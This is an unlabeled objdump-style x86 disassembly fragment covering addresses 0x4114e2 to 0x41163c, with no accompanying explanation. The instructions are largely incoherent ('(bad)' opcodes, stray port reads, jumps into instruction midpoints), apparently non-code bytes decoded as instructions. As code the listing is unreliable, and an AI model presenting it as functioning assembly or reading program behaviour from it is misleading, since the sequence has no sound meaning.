  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
